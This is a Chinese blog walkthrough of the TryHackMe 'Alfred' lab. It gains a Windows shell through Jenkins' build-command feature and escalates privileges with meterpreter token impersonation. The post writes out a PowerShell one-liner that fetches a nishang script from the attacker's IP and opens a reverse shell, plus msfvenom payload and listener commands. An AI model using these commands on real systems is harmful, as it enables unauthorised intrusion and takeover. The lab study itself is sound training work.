---
title: "Thm-alfred"
date: "2024-05-14"
description: ""
---

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514215259.png)

机器信息

Alfred 阿尔佛雷德

状态

未知

系统

windows

详细信息

jenkens 的一个未授权访问的 漏洞 打点同时通道建立 windows nishang框架和msf 联动 直接getshell 使用windows个人token伪造提权

## [](#循例信息收集 "循例信息收集")循例信息收集

```shell
# 简单信息收集查看开放端口Scanned at 2024-05-06 13:41:27 BST for 19sNot shown: 997 filtered portsReason: 997 no-responsesPORT     STATE SERVICE       REASON80/tcp   open  http          syn-ack ttl 1283389/tcp open  ms-wbt-server syn-ack ttl 1288080/tcp open  http-proxy    syn-ack ttl 128MAC Address: 02:63:3A:F8:06:C9 (Unknown)
```

### [](#详细扫描 "详细扫描")详细扫描

```shell
Host is up (0.00030s latency).PORT     STATE    SERVICE    VERSION80/tcp   filtered http3389/tcp open     tcpwrapped| ssl-cert: Subject: commonName=alfred| Not valid before: 2024-05-06T09:05:43|_Not valid after:  2024-11-05T09:05:438080/tcp filtered http-proxyMAC Address: 02:25:99:23:A0:73 (Unknown)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: specialized|WAP|phoneRunning: iPXE 1.X, Linux 2.4.X|2.6.X, Sony Ericsson embeddedOS CPE: cpe:/o:ipxe:ipxe:1.0.0%2b cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivazOS details: iPXE 1.0.0+, Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phoneNetwork Distance: 1 hopTRACEROUTEHOP RTT     ADDRESS1   0.30 ms ip-10-10-140-74.eu-west-1.compute.internal (10.10.140.74)
```

### [](#最大的感受-端口太少了-…… "最大的感受 端口太少了 ……")最大的感受 端口太少了 ……

> 看来又是磨web的一天

### [](#80端口 "80端口")80端口

> 纯扯淡 啥也没有

#### [](#8080 "8080")8080

> jenkins 一个持续集成的工具

jenkins

[Jenkins 持续集成工具](Jenkins%20%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%B7%A5%E5%85%B7.md)

[弱口令 未授权进入后台](Jenkins%E5%8A%9F%E8%83%BD%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md#%E5%BC%B1%E5%8F%A3%E4%BB%A4%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0)

这是一个远程代码执行漏洞

### [](#Get-shell "Get_shell")Get\_shell

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511202227.png)  
这个地方可以配置命令 可以直接执行

windows打点

[windows打点通道](windows%E6%89%93%E7%82%B9%E9%80%9A%E9%81%93.md)

```powershell
# 感觉这个可以通用 这个 命令 # 基本调用了powershell中的命令 # 基本上 可以 通杀了 # 先下载之后再进行一个 执行反向连接  powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/ Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port这段PowerShell命令执行的是一个反向TCP PowerShell脚本。让我逐步解释一下：1. `powershell iex`: 这部分调用了PowerShell解释器，并使用`iex`（`Invoke-Expression`）命令来执行后续的脚本或命令。    2. `(New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1')`: 这部分使用`Net.WebClient`对象创建一个Web客户端，并调用`DownloadString`方法从指定的URL下载一个PowerShell脚本（`Invoke-PowerShellTcp.ps1`）。在这里，你需要替换`your-ip`和`your-port`为实际的IP地址和端口号。    3. `Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`: 这部分调用了`Invoke-PowerShellTcp.ps1`脚本，并传递了参数`-Reverse`、`-IPAddress`和`-Port`。`-Reverse`参数表示在反向连接模式下运行，即连接到指定的IP地址和端口。`-IPAddress`和`-Port`参数分别指定了用于反向连接的目标IP地址和端口号，这也需要替换为实际的IP地址和端口号。
```

#### [](#http服务 "http服务")http服务

> 先进入nishang的shells里面  
> ![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511202458.png)

#### [](#payloads "payloads")payloads

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.69.232:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.69.232 -Port 4444
```

> 直接反向shell 连接回来

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511203021.png)  
不知道为啥卡的要死 要转半天  
保存配置之后需要进行一个 build now

成功getshell  
太丝滑了 丝滑的我不敢相信这是我的网络状态  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240511211507.png)

### [](#稳定的meterpreter "稳定的meterpreter")稳定的meterpreter

先生成一个免杀 exe 文件之后通过http服务下载  
之后执行反弹shell

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514160431.png)  
看到这个之后可以看到一个很酷的东西 可以直接在cmd中执行windows下载命令下载exe到本地然后执行就可以反弹shell  
哦不搞错了我们要用meterpreter 应该用msf

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe端口监听use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run注意点 端口监听需要 payloads一致Start-Process "shell_name.exe"
```

## [](#提权-– "提权 –>")提权 –>

windows提权

[windows个人权限](windows%E4%B8%AA%E4%BA%BA%E6%9D%83%E9%99%90.md)

权限提升

\[\[权限管理.md#whoami 命令\]\]

```powershell
"whoami /priv" - SeIncreaseQuotaPrivilege: 调整进程的内存配额权限，目前被禁用。- SeSecurityPrivilege: 管理审计和安全日志的权限，目前被禁用。- SeTakeOwnershipPrivilege: 接管文件或其他对象的权限，目前被禁用。- SeLoadDriverPrivilege: 载入和卸载设备驱动程序的权限，目前被禁用。- SeSystemProfilePrivilege: 为系统性能进行分析的权限，目前被禁用。- SeSystemtimePrivilege: 更改系统时间的权限，目前被禁用。- SeProfileSingleProcessPrivilege: 为单个进程创建性能分析的权限，目前被禁用。- SeIncreaseBasePriorityPrivilege: 增加进程的调度优先级的权限，目前被禁用。- SeCreatePagefilePrivilege: 创建页面文件的权限，目前被禁用。- SeBackupPrivilege: 备份文件和目录的权限，目前被禁用。- SeRestorePrivilege: 恢复文件和目录的权限，目前被禁用。- SeShutdownPrivilege: 关闭系统的权限，目前被禁用。- SeDebugPrivilege: 调试程序的权限，目前已启用。- SeSystemEnvironmentPrivilege: 修改固件环境值的权限，目前被禁用。- SeChangeNotifyPrivilege: 绕过遍历检查的权限，目前已启用。- SeRemoteShutdownPrivilege: 强制从远程系统关闭的权限，目前被禁用。- SeUndockPrivilege: 从停靠站中移除计算机的权限，目前被禁用。- SeManageVolumePrivilege: 执行卷维护任务的权限，目前被禁用。- SeImpersonatePrivilege: 身份验证后模拟客户端的权限，目前已启用。- SeCreateGlobalPrivilege: 创建全局对象的权限，目前已启用。- SeIncreaseWorkingSetPrivilege: 增加进程工作集的权限，目前被禁用。- SeTimeZonePrivilege: 更改时区的权限，目前被禁用。- SeCreateSymbolicLinkPrivilege: 创建符号链接的权限，目前被禁用。
```

> 利用load incognito 模块去打 这个是个隐身模块

```shell
list_tokens -gimpersonate_token "BUILTIN\Administrators"
```

> 正如上述所说的我们的那个不仅需要个人的高权限令牌 更需要一个 高权限的进程  
> 此时就会想到 使用migrate 迁移我们meterpreter的进程

直接ps 查看最近的 进程直接看最高权限进程(喵的这么强大 meterpreter 直接可以使用migrate 直接可以迁移 进程到任意一个进程)  
![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514212217.png)

![image.png](https://raw.githubusercontent.com/k1t0111/blog/main/image/20240514212128.png)
